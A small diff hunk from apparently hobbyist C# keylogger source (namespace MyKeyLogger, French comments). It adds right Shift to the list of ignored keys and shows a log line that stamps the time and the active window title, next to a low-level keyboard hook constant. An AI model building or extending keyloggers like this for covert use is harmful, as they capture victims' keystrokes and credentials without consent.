@@ -83,7 +83,7 @@ namespace MyKeyLogger
 		//
 		private static string data = DateTime.Now.ToString("dd/MM/yyyy HH:mm") + "\\:\\" + ActiveWindows.ActiveWindowName() + "\\:\\";
 		// Pour ignorer les appui
-		private static int[] IgnoredKey = {160, 162, 163, 164, 20, 165};
+		private static int[] IgnoredKey = {160,161, 162, 163, 164, 20, 165};
 		
 		// 
 		private const int WH_KEYBOARD_LL = 13;
